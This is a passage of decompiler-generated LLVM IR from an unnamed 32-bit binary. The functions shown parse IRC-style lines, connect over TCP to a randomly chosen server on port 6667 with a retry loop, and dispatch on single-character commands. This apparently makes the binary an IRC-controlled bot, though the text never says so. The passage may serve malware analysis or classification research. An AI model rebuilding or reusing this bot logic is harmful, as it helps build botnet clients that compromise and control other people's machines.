  uselistorder i8** @global_var_8055a48.11, { 6, 0, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32)* @function_80482b2, { 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 2, 1, 0, 8, 7, 6, 5, 4, 3 }
  uselistorder i64* @global_var_8055a4c.12, { 6, 5, 0, 4, 3, 2, 1 }
  uselistorder i8* %arg2, { 1, 2, 3, 0, 4, 5 }
  uselistorder label %dec_label_pc_804aa97, { 5, 4, 1, 2, 3, 0 }
  uselistorder label %bb, { 1, 0 }
  uselistorder label %dec_label_pc_804a9bb, { 1, 0 }
  uselistorder label %dec_label_pc_804a958.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804a980, { 1, 0 }
  uselistorder label %dec_label_pc_804a8df, { 1, 0 }
  uselistorder label %dec_label_pc_804a87c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804a8a4, { 1, 0 }
}

define i32 @function_804aa9e() local_unnamed_addr {
dec_label_pc_804aa9e:
  %v0_804aaa4 = load i32, i32* @global_var_8058204.80, align 4
  %v1_804aaad = call i32 @function_804e0e5(i32 %v0_804aaa4)
  store i32 %v1_804aaad, i32* @eax, align 4
  %v0_804aab5 = call i32 @function_80484c9()
  store i32 %v0_804aab5, i32* @global_var_8058204.80, align 4
  ret i32 %v0_804aab5
}

define i32 @function_804aac1(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804aac1:
  %tmp19 = inttoptr i32 %arg2 to i8*
  %v4_804aad7 = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_804aad4

dec_label_pc_804aad1:                             ; preds = %dec_label_pc_804aaf3
  %v4_804aad1 = add i32 %storemerge, 1
  br label %dec_label_pc_804aad4

dec_label_pc_804aad4:                             ; preds = %dec_label_pc_804aac1, %dec_label_pc_804aad1
  %storemerge = phi i32 [ %v4_804aad1, %dec_label_pc_804aad1 ], [ 0, %dec_label_pc_804aac1 ]
  store i1 false, i1* @df, align 1
  store i32 %v4_804aad7, i32* @edi, align 4
  %v3_804aae8 = call i32 @_strlen(i8* %arg1)
  %v7_804aaef = icmp ult i32 %storemerge, %v3_804aae8
  %v1_804aaf1 = icmp eq i1 %v7_804aaef, false
  %.pre = add i32 %storemerge, %v4_804aad7
  br i1 %v1_804aaf1, label %dec_label_pc_804aad4.dec_label_pc_804aaff_crit_edge, label %dec_label_pc_804aaf3

dec_label_pc_804aad4.dec_label_pc_804aaff_crit_edge: ; preds = %dec_label_pc_804aad4
  %.pre12 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_804aaff

dec_label_pc_804aaf3:                             ; preds = %dec_label_pc_804aad4
  %v1_804aaf9 = inttoptr i32 %.pre to i8*
  %v2_804aaf9 = load i8, i8* %v1_804aaf9, align 1
  %v10_804aafb = icmp eq i8 %v2_804aaf9, 33
  %v1_804aafd = icmp eq i1 %v10_804aafb, false
  br i1 %v1_804aafd, label %dec_label_pc_804aad1, label %dec_label_pc_804aaff

dec_label_pc_804aaff:                             ; preds = %dec_label_pc_804aaf3, %dec_label_pc_804aad4.dec_label_pc_804aaff_crit_edge
  %v1_804ab05.pre-phi = phi i8* [ %.pre12, %dec_label_pc_804aad4.dec_label_pc_804aaff_crit_edge ], [ %v1_804aaf9, %dec_label_pc_804aaf3 ]
  store i8 0, i8* %v1_804ab05.pre-phi, align 1
  %v0_804ab08 = load i32, i32* @global_var_8058204.80, align 4
  %v3_804ab14 = call i32 @function_804cfdc(i8* %arg1, i32 %v0_804ab08)
  %v1_804ab1c = icmp eq i32 %v3_804ab14, 0
  %v1_804ab1e = icmp eq i1 %v1_804ab1c, false
  br i1 %v1_804ab1e, label %dec_label_pc_804ab59, label %dec_label_pc_804ab20

dec_label_pc_804ab20:                             ; preds = %dec_label_pc_804aaff
  %v2_804ab23 = load i8, i8* %tmp19, align 1
  %v10_804ab25 = icmp eq i8 %v2_804ab23, 58
  %v1_804ab27 = icmp eq i1 %v10_804ab25, false
  br i1 %v1_804ab27, label %dec_label_pc_804ab2c, label %dec_label_pc_804ab29

dec_label_pc_804ab29:                             ; preds = %dec_label_pc_804ab20
  %v5_804ab29 = add i32 %arg2, 1
  %v22_804ab29 = inttoptr i32 %v5_804ab29 to i8*
  br label %dec_label_pc_804ab2c

dec_label_pc_804ab2c:                             ; preds = %dec_label_pc_804ab20, %dec_label_pc_804ab29
  %stack_var_12.0 = phi i8* [ %tmp19, %dec_label_pc_804ab20 ], [ %v22_804ab29, %dec_label_pc_804ab29 ]
  %v0_804ab2c = load i32, i32* @global_var_8058204.80, align 4
  %v1_804ab31 = icmp eq i32 %v0_804ab2c, 0
  br i1 %v1_804ab31, label %dec_label_pc_804ab2c.dec_label_pc_804ab46_crit_edge, label %dec_label_pc_804ab35

dec_label_pc_804ab2c.dec_label_pc_804ab46_crit_edge: ; preds = %dec_label_pc_804ab2c
  br label %dec_label_pc_804ab46

dec_label_pc_804ab35:                             ; preds = %dec_label_pc_804ab2c
  %v1_804ab3e = call i32 @function_804e0e5(i32 %v0_804ab2c)
  br label %dec_label_pc_804ab46

dec_label_pc_804ab46:                             ; preds = %dec_label_pc_804ab2c.dec_label_pc_804ab46_crit_edge, %dec_label_pc_804ab35
  %v4_804ab49 = ptrtoint i8* %stack_var_12.0 to i32
  %v1_804ab4c = call i32 @function_804d014(i32 %v4_804ab49)
  store i32 %v1_804ab4c, i32* @global_var_8058204.80, align 4
  br label %dec_label_pc_804ab59

dec_label_pc_804ab59:                             ; preds = %dec_label_pc_804aaff, %dec_label_pc_804ab46
  %v0_804ab5d = phi i32 [ %v3_804ab14, %dec_label_pc_804aaff ], [ %v1_804ab4c, %dec_label_pc_804ab46 ]
  ret i32 %v0_804ab5d

; uselistorder directives
  uselistorder i32 %.pre, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i8* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804ab59, { 1, 0 }
  uselistorder label %dec_label_pc_804ab46, { 1, 0 }
  uselistorder label %dec_label_pc_804ab2c, { 1, 0 }
  uselistorder label %dec_label_pc_804aad4, { 1, 0 }
}

define i32 @function_804ab5e() local_unnamed_addr {
dec_label_pc_804ab5e:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp20 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804ab5e = load i32, i32* @ebp, align 4
  store i32 %v0_804ab5e, i32* %stack_var_-4, align 4
  %v4_804ab5e = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804ab5e, i32* @ebp, align 4
  %v15_804ab61 = ptrtoint i32* %stack_var_-44 to i32
  %v2_804ac39 = ptrtoint i32* %stack_var_-32 to i32
  %v2_804ac3c = ptrtoint i32* %stack_var_-28 to i32
  %v2_804ac8e = ptrtoint i32* %stack_var_-36 to i32
  br label %dec_label_pc_804ab66

dec_label_pc_804ab66:                             ; preds = %dec_label_pc_804ab66.backedge, %dec_label_pc_804ab5e
  %v0_804abad.pre14 = phi i32 [ %v15_804ab61, %dec_label_pc_804ab5e ], [ %storemerge16.in, %dec_label_pc_804ab66.backedge ]
  %stack_var_-8.0 = phi i32 [ %tmp20, %dec_label_pc_804ab5e ], [ %stack_var_-8.0.be, %dec_label_pc_804ab66.backedge ]
  store i32 -1, i32* @global_var_8058208.7, align 8
  store i32 1, i32* %stack_var_-36, align 4
  %v0_804ab77 = load i32, i32* @global_var_8055a40.60, align 64
  store i32 %v0_804ab77, i32* @eax, align 4
  %v1_804ab7c = icmp eq i32 %v0_804ab77, 0
  %v1_804ab7e = icmp eq i1 %v1_804ab7c, false
  br i1 %v1_804ab7e, label %dec_label_pc_804aba3, label %dec_label_pc_804ab80

dec_label_pc_804ab80:                             ; preds = %dec_label_pc_804ab66
  %v1_804ab80 = call i32 @function_804e3b8(i32 1)
  %v0_804ab87 = load i64, i64* @global_var_80556a0.99, align 8
  %v2_804ab90 = ashr i32 %v1_804ab80, 31
  %v2_804ab93 = zext i32 %v1_804ab80 to i64
  %v4_804ab93 = zext i32 %v2_804ab90 to i64
  %v5_804ab93 = mul nuw i64 %v4_804ab93, 4294967296
  %v6_804ab93 = or i64 %v5_804ab93, %v2_804ab93
  %v7_804ab93 = and i64 %v0_804ab87, 4294967295
  %v10_804ab93 = srem i64 %v6_804ab93, %v7_804ab93
  %v11_804ab93 = trunc i64 %v10_804ab93 to i32
  store i32 %v11_804ab93, i32* %edx.global-to-local, align 4
  store i32 %v11_804ab93, i32* %eax.global-to-local, align 4
  %v1_804ab97 = mul i32 %v11_804ab93, 4
  %v2_804ab97 = add i32 %v1_804ab97, ptrtoint ([16 x i8]** @global_var_80556a4.101 to i32)
  %v3_804ab97 = inttoptr i32 %v2_804ab97 to i32*
  %v4_804ab97 = load i32, i32* %v3_804ab97, align 4
  store i32 %v4_804ab97, i32* %eax.global-to-local, align 4
  store i32 %v4_804ab97, i32* @global_var_8058320.59, align 32
  %v0_804abad.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804aba3

dec_label_pc_804aba3:                             ; preds = %dec_label_pc_804ab66, %dec_label_pc_804ab80
  %v0_804abad.pre = phi i32 [ %v0_804abad.pre14, %dec_label_pc_804ab66 ], [ %v0_804abad.pre.pre, %dec_label_pc_804ab80 ]
  store i32 0, i32* @global_var_8055a40.60, align 64
  br label %dec_label_pc_804abad

dec_label_pc_804abad:                             ; preds = %dec_label_pc_804abad, %dec_label_pc_804aba3
  %v0_804abad = phi i32 [ %v1_804abbb, %dec_label_pc_804abad ], [ %v0_804abad.pre, %dec_label_pc_804aba3 ]
  %v1_804abb0 = add i32 %v0_804abad, -8
  %v2_804abb0 = inttoptr i32 %v1_804abb0 to i32*
  store i32 6, i32* %v2_804abb0, align 4
  %v1_804abb2 = add i32 %v0_804abad, -12
  %v2_804abb2 = inttoptr i32 %v1_804abb2 to i32*
  store i32 1, i32* %v2_804abb2, align 4
  %v1_804abb4 = add i32 %v0_804abad, -16
  %v2_804abb4 = inttoptr i32 %v1_804abb4 to i32*
  store i32 2, i32* %v2_804abb4, align 4
  %v0_804abb6 = load i32, i32* %stack_var_-36, align 4
  %v1_804abb6 = load i32, i32* %stack_var_-32, align 4
  %v2_804abb6 = load i32, i32* %stack_var_-28, align 4
  %v3_804abb6 = call i32 @function_804d6e8(i32 %v0_804abb6, i32 %v1_804abb6, i32 %v2_804abb6)
  %v0_804abbb = load i32, i32* @esp, align 4
  %v1_804abbb = add i32 %v0_804abbb, 16
  store i32 %v3_804abb6, i32* @global_var_8058208.7, align 8
  store i32 %v3_804abb6, i32* %eax.global-to-local, align 4
  %v2_804abc8 = icmp slt i32 %v3_804abb6, 0
  br i1 %v2_804abc8, label %dec_label_pc_804abad, label %dec_label_pc_804abcc

dec_label_pc_804abcc:                             ; preds = %dec_label_pc_804abad
  %v0_804abcc = load i32, i32* @global_var_8058320.59, align 32
  store i32 %v0_804abcc, i32* %eax.global-to-local, align 4
  %v3_804abd4 = inttoptr i32 %v0_804abbb to i32*
  store i32 %v0_804abcc, i32* %v3_804abd4, align 4
  %v0_804abd5 = load i32, i32* %stack_var_-36, align 4
  %v1_804abd5 = call i32 @function_804d200(i32 %v0_804abd5)
  store i32 %v1_804abd5, i32* %eax.global-to-local, align 4
  %v0_804abda = load i32, i32* @esp, align 4
  %v1_804abdd = icmp eq i32 %v1_804abd5, 0
  br i1 %v1_804abdd, label %dec_label_pc_804abf7, label %dec_label_pc_804abe1

dec_label_pc_804abe1:                             ; preds = %dec_label_pc_804abcc
  %v0_804abe1 = load i32, i32* @global_var_8058320.59, align 32
  store i32 %v0_804abe1, i32* %eax.global-to-local, align 4
  %v3_804abe9 = inttoptr i32 %v0_804abda to i32*
  store i32 %v0_804abe1, i32* %v3_804abe9, align 4
  %v0_804abea = load i32, i32* %stack_var_-36, align 4
  %v1_804abea = call i32 @function_804d200(i32 %v0_804abea)
  store i32 %v1_804abea, i32* %eax.global-to-local, align 4
  %v0_804abef = load i32, i32* @esp, align 4
  %v10_804abf2 = icmp eq i32 %v1_804abea, -1
  %v1_804abf5 = icmp eq i1 %v10_804abf2, false
  br i1 %v1_804abf5, label %dec_label_pc_804ac57, label %dec_label_pc_804abf7

dec_label_pc_804abf7:                             ; preds = %dec_label_pc_804abe1, %dec_label_pc_804abcc
  %v0_804abfc.in = phi i32 [ %v0_804abef, %dec_label_pc_804abe1 ], [ %v0_804abda, %dec_label_pc_804abcc ]
  %v0_804abf7 = load i32, i32* @global_var_8058320.59, align 32
  store i32 %v0_804abf7, i32* %eax.global-to-local, align 4
  %v3_804abff = inttoptr i32 %v0_804abfc.in to i32*
  store i32 %v0_804abf7, i32* %v3_804abff, align 4
  %v0_804ac00 = load i32, i32* %stack_var_-36, align 4
  %v1_804ac00 = call i32 @function_804d228(i32 %v0_804ac00)
  store i32 %v1_804ac00, i32* %eax.global-to-local, align 4
  %v0_804ac05 = load i32, i32* @esp, align 4
  %v4_804ac0b = icmp eq i32 %v1_804ac00, 0
  %v1_804ac0f = icmp eq i1 %v4_804ac0b, false
  br i1 %v1_804ac0f, label %dec_label_pc_804ac31, label %dec_label_pc_804ac11

dec_label_pc_804ac11:                             ; preds = %dec_label_pc_804abf7
  store i32 0, i32* @global_var_8058320.59, align 32
  %v0_804ac1b = load i32, i32* @global_var_8058208.7, align 8
  store i32 %v0_804ac1b, i32* %eax.global-to-local, align 4
  %v3_804ac23 = inttoptr i32 %v0_804ac05 to i32*
  store i32 %v0_804ac1b, i32* %v3_804ac23, align 4
  %v1_804ac24 = call i32 @function_804b2bc(i32 %v1_804ac00)
  br label %dec_label_pc_804ab66.backedge

dec_label_pc_804ab66.backedge:                    ; preds = %dec_label_pc_804ac11, %dec_label_pc_804ad73
  %storemerge = phi i32 [ %v1_804ac24, %dec_label_pc_804ac11 ], [ %v1_804ad86, %dec_label_pc_804ad73 ]
  %stack_var_-8.0.be = phi i32 [ %v1_804ac00, %dec_label_pc_804ac11 ], [ %stack_var_-8.1, %dec_label_pc_804ad73 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %storemerge18.in = load i32, i32* @esp, align 4
  %storemerge16.in = add i32 %storemerge18.in, 16
  br label %dec_label_pc_804ab66

dec_label_pc_804ac31:                             ; preds = %dec_label_pc_804abf7
  store i32 %v1_804ac00, i32* %eax.global-to-local, align 4
  %v1_804ac34 = add i32 %v1_804ac00, 12
  %v2_804ac34 = inttoptr i32 %v1_804ac34 to i32*
  %v3_804ac34 = load i32, i32* %v2_804ac34, align 4
  store i32 %v3_804ac34, i32* %edx.global-to-local, align 4
  store i32 %v1_804ac00, i32* %eax.global-to-local, align 4
  %v1_804ac42 = add i32 %v1_804ac00, 16
  %v2_804ac42 = inttoptr i32 %v1_804ac42 to i32*
  %v3_804ac42 = load i32, i32* %v2_804ac42, align 4
  store i32 %v3_804ac42, i32* %eax.global-to-local, align 4
  %v1_804ac45 = inttoptr i32 %v3_804ac42 to i32*
  %v2_804ac45 = load i32, i32* %v1_804ac45, align 4
  store i32 %v2_804ac45, i32* %eax.global-to-local, align 4
  %v2_804ac4a = add i32 %v0_804ac05, 8
  %v3_804ac4a = inttoptr i32 %v2_804ac4a to i32*
  store i32 %v3_804ac34, i32* %v3_804ac4a, align 4
  %v2_804ac4b = add i32 %v0_804ac05, 4
  %v3_804ac4b = inttoptr i32 %v2_804ac4b to i32*
  store i32 %v2_804ac3c, i32* %v3_804ac4b, align 4
  %v0_804ac4c = load i32, i32* %eax.global-to-local, align 4
  %v3_804ac4c = inttoptr i32 %v0_804ac05 to i32*
  store i32 %v0_804ac4c, i32* %v3_804ac4c, align 4
  %v1_804ac4d = load i32, i32* %stack_var_-4, align 4
  %v2_804ac4d = load i32, i32* %stack_var_0, align 4
  %v3_804ac4d = call i32 @function_804cfc4(i32 %v1_804ac00, i32 %v1_804ac4d, i32 %v2_804ac4d)
  store i32 %v3_804ac4d, i32* %eax.global-to-local, align 4
  %v0_804ac52 = load i32, i32* @esp, align 4
  br label %dec_label_pc_804ac6b

dec_label_pc_804ac57:                             ; preds = %dec_label_pc_804abe1
  %v0_804ac57 = load i32, i32* @global_var_8058320.59, align 32
  store i32 %v0_804ac57, i32* %eax.global-to-local, align 4
  %v3_804ac5f = inttoptr i32 %v0_804abef to i32*
  store i32 %v0_804ac57, i32* %v3_804ac5f, align 4
  %v1_804ac60 = call i32 @function_804d200(i32 %stack_var_-8.0)
  store i32 %v1_804ac60, i32* %eax.global-to-local, align 4
  %v0_804ac65 = load i32, i32* @esp, align 4
  store i32 %v1_804ac60, i32* %stack_var_-28, align 4
  br label %dec_label_pc_804ac6b

dec_label_pc_804ac6b:                             ; preds = %dec_label_pc_804ac31, %dec_label_pc_804ac57
  %v0_804ac71.in = phi i32 [ %v0_804ac52, %dec_label_pc_804ac31 ], [ %v0_804ac65, %dec_label_pc_804ac57 ]
  %stack_var_-8.1 = phi i32 [ %v1_804ac00, %dec_label_pc_804ac31 ], [ %stack_var_-8.0, %dec_label_pc_804ac57 ]
  store i32 2, i32* %stack_var_-32, align 4
  %v2_804ac74 = inttoptr i32 %v0_804ac71.in to i32*
  store i32 6667, i32* %v2_804ac74, align 4
  %v0_804ac79 = load i32, i32* %stack_var_-32, align 4
  %v1_804ac79 = call i32 @function_804d0f8(i32 %v0_804ac79)
  %v0_804ac7e = load i32, i32* @esp, align 4
  %v0_804ac85 = load i32, i32* @global_var_8058208.7, align 8
  store i32 %v0_804ac85, i32* %edx.global-to-local, align 4
  store i32 %v2_804ac8e, i32* %eax.global-to-local, align 4
  %v2_804ac91 = add i32 %v0_804ac7e, 8
  %v3_804ac91 = inttoptr i32 %v2_804ac91 to i32*
  store i32 %v2_804ac8e, i32* %v3_804ac91, align 4
  %v1_804ac92 = add i32 %v0_804ac7e, 4
  %v2_804ac92 = inttoptr i32 %v1_804ac92 to i32*
  store i32 21537, i32* %v2_804ac92, align 4
  %v0_804ac97 = load i32, i32* %edx.global-to-local, align 4
  %v3_804ac97 = inttoptr i32 %v0_804ac7e to i32*
  store i32 %v0_804ac97, i32* %v3_804ac97, align 4
  %sext = mul i32 %v1_804ac79, 65536
  %v1_804ac98 = sdiv i32 %sext, 65536
  %v4_804ac98 = call i32 @function_804b364(i32 %v1_804ac98, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804ac98, i32* %eax.global-to-local, align 4
  %v0_804ac9d = load i32, i32* @esp, align 4
  %v2_804aca3 = inttoptr i32 %v0_804ac9d to i32*
  store i32 0, i32* %v2_804aca3, align 4
  %v2_804aca5 = inttoptr i32 %v1_804ac98 to i32*
  %v3_804aca5 = call i32 @function_804b418(i32* %v2_804aca5)
  store i32 %v3_804aca5, i32* %eax.global-to-local, align 4
  %v1_804ad5f = inttoptr i32 %v3_804aca5 to i32*
  br label %dec_label_pc_804ad5a

dec_label_pc_804acb5:                             ; preds = %dec_label_pc_804ad5a
  %v1_804acb5 = call i32 @function_804b4bc(i32 %v3_804aca5)
  %v1_804acba = inttoptr i32 %v1_804acb5 to i32*
  store i32 0, i32* %v1_804acba, align 4
  store i32 %v2_804ac39, i32* %eax.global-to-local, align 4
  %v0_804acc3 = load i32, i32* @global_var_8058208.7, align 8
  store i32 %v0_804acc3, i32* %edx.global-to-local, align 4
  %v0_804acc9 = load i32, i32* @esp, align 4
  %v1_804accc = add i32 %v0_804acc9, -8
  %v2_804accc = inttoptr i32 %v1_804accc to i32*
  store i32 16, i32* %v2_804accc, align 4
  %v2_804acce = add i32 %v0_804acc9, -12
  %v3_804acce = inttoptr i32 %v2_804acce to i32*
  store i32 %v2_804ac39, i32* %v3_804acce, align 4
  %v0_804accf = load i32, i32* %edx.global-to-local, align 4
  %v2_804accf = add i32 %v0_804acc9, -16
  %v3_804accf = inttoptr i32 %v2_804accf to i32*
  store i32 %v0_804accf, i32* %v3_804accf, align 4
  %v2_804acd0 = load i32, i32* %stack_var_-4, align 4
  %v3_804acd0 = call i32 @function_804d5e4(i32 %v3_804aca5, i32 %stack_var_-8.1, i32 %v2_804acd0)
  store i32 %v3_804acd0, i32* %eax.global-to-local, align 4
  %v0_804acd5 = load i32, i32* @esp, align 4
  %v1_804acd5 = add i32 %v0_804acd5, 16
  %v1_804acd8 = icmp eq i32 %v3_804acd0, 0
  br i1 %v1_804acd8, label %dec_label_pc_804ace8, label %dec_label_pc_804acdc

dec_label_pc_804acdc:                             ; preds = %dec_label_pc_804acb5
  %v1_804acdc = call i32 @function_804b4bc(i32 %v3_804aca5)
  store i32 %v1_804acdc, i32* %eax.global-to-local, align 4
  %v1_804ace1 = inttoptr i32 %v1_804acdc to i32*
  %v2_804ace1 = load i32, i32* %v1_804ace1, align 4
  store i32 %v2_804ace1, i32* %eax.global-to-local, align 4
  %v9_804ace3 = icmp eq i32 %v2_804ace1, 106
  %v1_804ace6 = icmp eq i1 %v9_804ace3, false
  br i1 %v1_804ace6, label %dec_label_pc_804ad35, label %dec_label_pc_804acdc.dec_label_pc_804ace8_crit_edge

dec_label_pc_804acdc.dec_label_pc_804ace8_crit_edge: ; preds = %dec_label_pc_804acdc
  %v0_804aced.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804ace8

dec_label_pc_804ace8:                             ; preds = %dec_label_pc_804acb5, %dec_label_pc_804acdc.dec_label_pc_804ace8_crit_edge
  %v0_804aced = phi i32 [ %v0_804aced.pre, %dec_label_pc_804acdc.dec_label_pc_804ace8_crit_edge ], [ %v1_804acd5, %dec_label_pc_804acb5 ]
  %v0_804ace8 = load i32, i32* @global_var_8058208.7, align 8
  store i32 %v0_804ace8, i32* %eax.global-to-local, align 4
  %v1_804acf0 = add i32 %v0_804aced, -16
  %v2_804acf0 = inttoptr i32 %v1_804acf0 to i32*
  store i32 0, i32* %v2_804acf0, align 4
  %v1_804acf2 = add i32 %v0_804aced, -20
  %v2_804acf2 = inttoptr i32 %v1_804acf2 to i32*
  store i32 0, i32* %v2_804acf2, align 4
  %v1_804acf4 = add i32 %v0_804aced, -24
  %v2_804acf4 = inttoptr i32 %v1_804acf4 to i32*
  store i32 13, i32* %v2_804acf4, align 4
  %v1_804acf6 = add i32 %v0_804aced, -28
  %v2_804acf6 = inttoptr i32 %v1_804acf6 to i32*
  store i32 1, i32* %v2_804acf6, align 4
  %v0_804acf8 = load i32, i32* %eax.global-to-local, align 4
  %v2_804acf8 = add i32 %v0_804aced, -32
  %v3_804acf8 = inttoptr i32 %v2_804acf8 to i32*
  store i32 %v0_804acf8, i32* %v3_804acf8, align 4
  %v0_804acf9 = call i32 @function_804d6ac()
  %v0_804acfe = load i32, i32* @esp, align 4
  %v0_804ad01 = load i32, i32* @global_var_8058208.7, align 8
  store i32 %v0_804ad01, i32* %eax.global-to-local, align 4
  %v1_804ad09 = add i32 %v0_804acfe, 16
  %v2_804ad09 = inttoptr i32 %v1_804ad09 to i32*
  store i32 0, i32* %v2_804ad09, align 4
  %v1_804ad0b = add i32 %v0_804acfe, 12
  %v2_804ad0b = inttoptr i32 %v1_804ad0b to i32*
  store i32 0, i32* %v2_804ad0b, align 4
  %v1_804ad0d = add i32 %v0_804acfe, 8
  %v2_804ad0d = inttoptr i32 %v1_804ad0d to i32*
  store i32 2, i32* %v2_804ad0d, align 4
  %v1_804ad0f = add i32 %v0_804acfe, 4
  %v2_804ad0f = inttoptr i32 %v1_804ad0f to i32*
  store i32 1, i32* %v2_804ad0f, align 4
  %v0_804ad11 = load i32, i32* %eax.global-to-local, align 4
  %v3_804ad11 = inttoptr i32 %v0_804acfe to i32*
  store i32 %v0_804ad11, i32* %v3_804ad11, align 4
  %v0_804ad12 = call i32 @function_804d6ac()
  %v0_804ad17 = load i32, i32* @esp, align 4
  %v0_804ad1a = load i32, i32* @global_var_8058208.7, align 8
  store i32 %v0_804ad1a, i32* %eax.global-to-local, align 4
  %v1_804ad22 = add i32 %v0_804ad17, 16
  %v2_804ad22 = inttoptr i32 %v1_804ad22 to i32*
  store i32 0, i32* %v2_804ad22, align 4
  %v1_804ad24 = add i32 %v0_804ad17, 12
  %v2_804ad24 = inttoptr i32 %v1_804ad24 to i32*
  store i32 0, i32* %v2_804ad24, align 4
  %v1_804ad26 = add i32 %v0_804ad17, 8
  %v2_804ad26 = inttoptr i32 %v1_804ad26 to i32*
  store i32 9, i32* %v2_804ad26, align 4
  %v1_804ad28 = add i32 %v0_804ad17, 4
  %v2_804ad28 = inttoptr i32 %v1_804ad28 to i32*
  store i32 1, i32* %v2_804ad28, align 4
  %v0_804ad2a = load i32, i32* %eax.global-to-local, align 4
  %v3_804ad2a = inttoptr i32 %v0_804ad17 to i32*
  store i32 %v0_804ad2a, i32* %v3_804ad2a, align 4
  %v0_804ad2b = call i32 @function_804d6ac()
  store i32 %v0_804ad2b, i32* %eax.global-to-local, align 4
  ret i32 %v0_804ad2b

dec_label_pc_804ad35:                             ; preds = %dec_label_pc_804acdc
  %v1_804ad35 = call i32 @function_804b4bc(i32 %v3_804aca5)
  store i32 %v1_804ad35, i32* %eax.global-to-local, align 4
  %v1_804ad3a = inttoptr i32 %v1_804ad35 to i32*
  %v2_804ad3a = load i32, i32* %v1_804ad3a, align 4
  store i32 %v2_804ad3a, i32* %eax.global-to-local, align 4
  %v9_804ad3c = icmp eq i32 %v2_804ad3a, 115
  br i1 %v9_804ad3c, label %dec_label_pc_804ad4d, label %dec_label_pc_804ad41

dec_label_pc_804ad41:                             ; preds = %dec_label_pc_804ad35
  %v1_804ad41 = call i32 @function_804b4bc(i32 %v3_804aca5)
  store i32 %v1_804ad41, i32* %eax.global-to-local, align 4
  %v1_804ad46 = inttoptr i32 %v1_804ad41 to i32*
  %v2_804ad46 = load i32, i32* %v1_804ad46, align 4
  store i32 %v2_804ad46, i32* %eax.global-to-local, align 4
  %v9_804ad48 = icmp eq i32 %v2_804ad46, 114
  %v1_804ad4b = icmp eq i1 %v9_804ad48, false
  br i1 %v1_804ad4b, label %dec_label_pc_804ad41.dec_label_pc_804ad73_crit_edge, label %dec_label_pc_804ad4d

dec_label_pc_804ad41.dec_label_pc_804ad73_crit_edge: ; preds = %dec_label_pc_804ad41
  %v0_804ad82.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804ad73

dec_label_pc_804ad4d:                             ; preds = %dec_label_pc_804ad41, %dec_label_pc_804ad35
  %v0_804ad4d = load i32, i32* @esp, align 4
  %v1_804ad50 = add i32 %v0_804ad4d, -16
  %v2_804ad50 = inttoptr i32 %v1_804ad50 to i32*
  store i32 1, i32* %v2_804ad50, align 4
  %v1_804ad52 = call i32 @function_804e958(i32 %v3_804aca5)
  store i32 %v1_804ad52, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ad5a

dec_label_pc_804ad5a:                             ; preds = %dec_label_pc_804ac6b, %dec_label_pc_804ad4d
  %storemerge4.in.in = load i32, i32* @esp, align 4
  %v2_804ad5d = inttoptr i32 %storemerge4.in.in to i32*
  store i32 0, i32* %v2_804ad5d, align 4
  %v2_804ad5f = call i32 @function_804b418(i32* %v1_804ad5f)
  %v0_804ad64 = load i32, i32* @esp, align 4
  %v1_804ad64 = add i32 %v0_804ad64, 16
  %v5_804ad67 = sub i32 %v2_804ad5f, %v3_804aca5
  store i32 %v5_804ad67, i32* %eax.global-to-local, align 4
  %tmp38 = icmp ult i32 %v5_804ad67, 10
  br i1 %tmp38, label %dec_label_pc_804acb5, label %dec_label_pc_804ad73

dec_label_pc_804ad73:                             ; preds = %dec_label_pc_804ad5a, %dec_label_pc_804ad41.dec_label_pc_804ad73_crit_edge
  %v0_804ad82 = phi i32 [ %v0_804ad82.pre, %dec_label_pc_804ad41.dec_label_pc_804ad73_crit_edge ], [ %v1_804ad64, %dec_label_pc_804ad5a ]
  store i32 0, i32* @global_var_8058320.59, align 32
  %v0_804ad7d = load i32, i32* @global_var_8058208.7, align 8
  store i32 %v0_804ad7d, i32* %eax.global-to-local, align 4
  %v2_804ad85 = add i32 %v0_804ad82, -16
  %v3_804ad85 = inttoptr i32 %v2_804ad85 to i32*
  store i32 %v0_804ad7d, i32* %v3_804ad85, align 4
  %v1_804ad86 = call i32 @function_804b2bc(i32 %v3_804aca5)
  br label %dec_label_pc_804ab66.backedge

; uselistorder directives
  uselistorder i32 %v0_804aced, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v3_804aca5, { 0, 7, 2, 1, 3, 4, 5, 6, 8, 9 }
  uselistorder i32 %v1_804ac98, { 1, 0 }
  uselistorder i32 %stack_var_-8.1, { 1, 0 }
  uselistorder i32 %v0_804ac05, { 2, 0, 1, 3 }
  uselistorder i32 %v1_804ac00, { 2, 3, 5, 4, 7, 6, 0, 1, 8, 9 }
  uselistorder i32 %v0_804abef, { 1, 0 }
  uselistorder i32 %v3_804abb6, { 2, 1, 0 }
  uselistorder i32 %v0_804abad, { 2, 1, 0 }
  uselistorder i32 %v2_804ac39, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0, 3, 2 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-28, { 1, 0, 2 }
  uselistorder i32* %stack_var_-36, { 1, 3, 2, 0, 4, 5 }
